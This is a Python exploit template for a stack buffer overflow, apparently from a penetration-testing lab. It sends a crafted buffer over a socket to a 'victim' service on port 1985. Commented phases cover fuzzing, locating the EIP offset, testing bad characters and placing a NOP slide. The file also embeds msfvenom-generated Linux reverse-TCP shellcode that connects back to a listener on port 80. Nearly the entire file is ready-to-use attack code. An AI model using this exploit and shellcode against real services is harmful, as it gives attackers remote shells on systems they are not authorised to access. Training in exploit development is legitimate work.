#!/usr/bin/python
# Basic system fuzzer for local BOF analysis
import socket
import sys
import os

ip = "192.168.49.229" # Victim IP
port = 1985 # Service Port

# Part 1 - buff - Increase for every attempt until crash
# Part 2 - buff - Fill with pattern from msf-pattern_create
## msf-pattern_create -l 100
# Part 3 - buff - Set to offset amount
## msf-pattern_offset -l 100 -q 316a4130
buff = "A" * 100 
nullByte = "\x00"

# Part 3 - eip - set equal to "B"
# Part 6 - eip - set equal to JMP
eip = "B" * 4
offset = "C" * 24 # Change to what's left over minus buff and eip

# Part 4 - expandStack
expandStack = "D" * 200 # Need about 100-200 bytes for a stable reverse shell

# Part 5 - badChars - Check ESP dump and ru-run as many times as needed
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# Part 6 - buf - Enter the shellcode here:
##msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.49.229 lport=80 -f python -b '\x00'
buf =  b""
buf += b"\xb8\x7d\x02\xa4\x49\xd9\xc2\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\xbe\x06\x46"
buf += b"\xbc\x71\xdc\x71\xdc\x22\xa1\x2e\x49\xc6\xac\x30\x3d"
buf += b"\xa0\x63\x32\xad\x75\xcc\x0c\x1f\x05\x65\x0a\x66\x6d"
buf += b"\xb6\x44\xa9\x88\x5e\x97\xca\x52\xcf\x1e\x2b\xe2\x89"
buf += b"\x70\xfd\x51\xe5\x72\x74\xb4\xc4\xf5\xd4\x5e\xb9\xda"
buf += b"\xab\xf6\x2d\x0a\x63\x64\xc7\xdd\x98\x3a\x44\x57\xbf"
buf += b"\x0a\x61\xaa\xc0"

nopSlide = "\x90" * 16


# ---------------------------------------
# Complete - comment/uncomment per phase
# Parts 1-2 
inputBuffer = buff + nullByte
# Part 3
#inputBuffer = buff + eip + offset + nullByte
# Part 4
#inputBuffer = buff + eip + offset + expandStack + nullByte
# Part 5
#inputBuffer = buff + eip + offset + badchars + nullByte
# Part 6
#inputBuffer = buff + eip + offset + nopSlide + buf + nullByte

# ---------------------------------------
# Ship it!
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(inputBuffer)
